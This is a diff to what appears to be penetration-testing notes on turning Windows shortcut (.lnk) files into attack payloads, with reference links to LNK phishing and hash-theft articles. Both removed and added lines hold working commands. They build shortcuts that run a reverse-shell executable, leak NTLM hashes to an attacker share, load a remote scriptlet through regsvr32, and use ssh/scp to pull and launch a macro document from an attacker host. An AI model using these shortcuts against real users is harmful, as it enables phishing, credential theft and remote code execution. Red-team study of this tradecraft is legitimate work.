@@ -33,62 +33,25 @@ $ rm archive.zip
 $ shortcutgen -p lnk -i "FILESERVER" -s "Documents" -n "document.docx" -d "A hosting server." -o fileserver.lnk
 ```
 
-### 1.2 - PyLNK
-
-#### 1.2.1 - Setup
-
-##### 1.2.1.1 - Package Manager
-
-Install it according to your package manager.
-
-```
-$ yay -S python-pylnk3
-```
-
-##### 1.2.1.2 - Universal Install
-
-```
-$ git clone https://github.com/strayge/pylnk.git && \
-sudo python3 setup.py install
-```
-
-### 2.2 - Generate Payload
-
-#### 2.2.1 - Reverse Shell
-
-```
-$ pylnk3 c C:\Windows\System32\cmd.exe payload.lnk -a "/c payload.exe" -ii <index_number> -m Minimized -d "<description>"
-```
-
-```
-$ pylnk3 c C:\Windows\System32\cmd.exe payload.lnk -a "/c payload.exe" -i /path/to/file.ext -m Minimized -d "<description>"
-```
-
-#### 2.2.2 - Capture NTLM Relay
-
-```
-$ pylnk c \\<attacker_IP>\<share_name>\@snare.txt shortcut_file.lnk
-
-$ pylnk c \\<attacker_IP>\<share_name>\snare.txt shortcut_file.lnk
-```
-
-Scriptlet file
-
-```
-$ pylnk c C:\Windows\System32\regsvr32.exe -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" payload.lnk
-```
-
-```
-$ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "\\<attacker_IP>\key.pem root@<IP>" payload.lnk
-```
-
 TODO: Provide use cases if any (refer to the link for SSH)
 
 ```
 $ pylnk c C:\Windows\System32\OpenSSH\ssh.exe -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
 ```
 
-### 1.3 - PowerShell
+Scriptlet file
+
+```
+$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" --icon "C:\Windows\System32\msi.dll,0" -o payload.lnk
+```
+
+SSH Key.
+
+```
+$ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-i \\<attacker_IP>\key.pem root@<IP>" --icon "C:\Windows\System32\msi.dll,0" -o payload.lnk
+```
+
+### 1.2 - PowerShell
 
 ```powershell
 $ErrorActionPreference = "Stop" # Halt on any error
@@ -207,6 +170,10 @@ try {
 
 - [rvrsh3ll: `Create-HotKeyLNK.ps1`](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)
 
+### Bordergate
+
+- [Bordergate: Disguising Client Side Payloads](https://www.bordergate.co.uk/disguising-client-side-payloads/)
+
 ### Pentestlab
 
 - [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)
@@ -214,6 +181,34 @@ try {
 ### Hacking Articles
 
 - [Hacking Articles: Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)
+
+### DMCXBLUE
+
+- [DMCXBLUE: Capturing Hashes](https://dmcxblue.net/2020/06/17/capturing-hashes/)
+
+### Osanda
+
+- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+
+### Assume Breach
+
+- [Assume Breach: Using LNK Files To Bypass Applocker](https://assume-breach.medium.com/home-grown-red-team-using-lnk-files-to-bypass-applocker-3fb1ecae291f)
+
+- [Assume Breach: LNK Phishing Revisited In 2023](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-revisited-in-2023-364daf70a06a)
+
+- [Assume Breach: LNK Phishing In 2023 Revisited…Again](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836)
+
+### RedSiege
+
+- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)
+
+### B4ckdoor
+
+- [b4ckdoor: Is Macro Phishing Dead in 2024? — A Scheduled Task for Initial Access and Persistence using macro by Abusing Shortcut Files and SSH](https://b4ckdoor.medium.com/is-macro-phishing-dead-in-2024-56b7b4473a29)
+
+### BadOption
+
+- [BadOption: ZipLink - Combine Zips and Lnk for fun and profit](https://badoption.eu/blog/2023/09/28/ZipLink.html)
 
 ### Uperesia
 
